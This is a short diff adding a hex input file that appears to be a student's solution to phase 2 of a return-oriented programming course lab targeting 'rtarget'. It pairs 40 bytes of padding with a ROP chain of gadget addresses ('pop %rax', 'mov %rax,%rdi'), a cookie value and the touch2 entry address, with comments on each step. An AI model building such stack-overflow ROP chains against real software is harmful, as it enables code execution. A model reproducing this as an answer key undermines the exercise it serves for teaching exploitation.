@@ -1,0 +1,15 @@
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+4a 1b 40 00 00 00 00 00		/* gadget's return address for (58 c3) machine code */
+				/* we wanna insert a value, so we need to pop */
+
+f9 62 f7 5f 00 00 00 00		/* cookie without tansform, and saved in %rax */
+56 1b 40 00 00 00 00 00		/* gadget's return address for (48 89 c7) */
+8e 19 40 00 00 00 00 00		/* touch2 entry address */
+
+/* Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of
+rtarget */
+
+/* we wanna make all 0s because it's 64 bits machine */
